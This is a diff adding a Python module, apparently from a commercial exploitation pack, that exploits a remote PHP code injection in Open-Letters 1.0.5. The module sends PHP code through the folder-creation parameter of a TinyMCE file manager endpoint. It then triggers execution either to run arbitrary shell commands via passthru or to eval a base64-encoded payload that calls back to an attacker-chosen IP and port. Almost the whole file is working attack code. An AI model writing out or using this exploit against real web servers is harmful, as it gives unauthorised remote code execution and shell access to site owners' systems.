@@ -1,0 +1,119 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+	
+from exploitutils import *
+from ExploitTypes.php_multi import *
+
+import canvasengine
+import time
+import urllib
+import libs.spkproxy as spkproxy #for urlopen
+
+# GUI info
+NAME = "Open-Letters Remote PHP Code Injection Vulnerability"
+
+DESCRIPTION = "Remote PHP code injection vulnerability in Open-Letters"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Open-Letters"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2015.04.22"
+DOCUMENTATION["VersionsAffected"] = "Open-Letters 1.0.5"
+DOCUMENTATION["References"] = "https://www.exploit-db.com/exploits/36816/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION="1.0"
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(php_multi):
+    def __init__(self):
+        php_multi.__init__(self)
+        self.port=80
+        self.host=""
+        self.ssl=""
+        self.name=NAME
+        self.basepath="/"
+        self.basepaths=["/openletters/","/"]
+        self.command=None 
+        self.basicauth_user=""
+        self.basicauth_password=""
+        self.hostname=None
+        self.foundstrings=["Open-Letters"]
+        self.testfile="index.php"
+
+        return
+
+    def request1(self):
+        """
+	Goes through a loop of log file paths in the phpexploit class
+	and trys to inject/include PHPcode in these log files to get execution.
+        """
+        
+        if self.command:
+            self.log("Command: %s"%self.command)
+            tag1   = "".join( [random.choice(string.digits) for i in xrange(8)] )
+            tag2   = "".join( [random.choice(string.digits) for i in xrange(8)] )
+            command=self.command
+            command="<?php print("+tag1+");passthru('"+command+"');print("+tag2+"); ?>"
+
+            params={}                
+            params["new_folder"]= command                
+            data = self.UA.POST("external_scripts/tinymce/plugins/ajaxfilemanager/ajax_create_folder.php", data=params)
+            data = self.UA.GET("external_scripts/tinymce/plugins/ajaxfilemanager/inc/data.php")
+
+            if tag1 in data:
+                result=data.split(tag1)[1].split(tag2)[0]
+                self.log("Command response: %s"%prettyprint(result))
+                return 1
+        else:
+            command=self.get_php_to_mosdef()
+            command=b64encode(command)
+
+            params={}                
+            params["new_folder"]= "<?php eval(base64_decode(%s)); ?>"%command                              
+            data = self.UA.POST("external_scripts/tinymce/plugins/ajaxfilemanager/ajax_create_folder.php", data=params)                    
+            data = self.UA.GET("external_scripts/tinymce/plugins/ajaxfilemanager/inc/data.php")
+                                
+            self.log("[+] Looking for PHP connectback")
+
+    def usage(self):
+        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
+        print "-t <target ip>"
+        print "-p <target port>                [optional]"
+        print "-O basepath: /path/to/phplist/[optional]"
+        print "-O hostname: target vhost       [optional]"
+        print "-O command:commandtorun         [optional]"
+        print "-l call back ip if doing connect back"
+        print "-d listening port for call back"
+        return
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
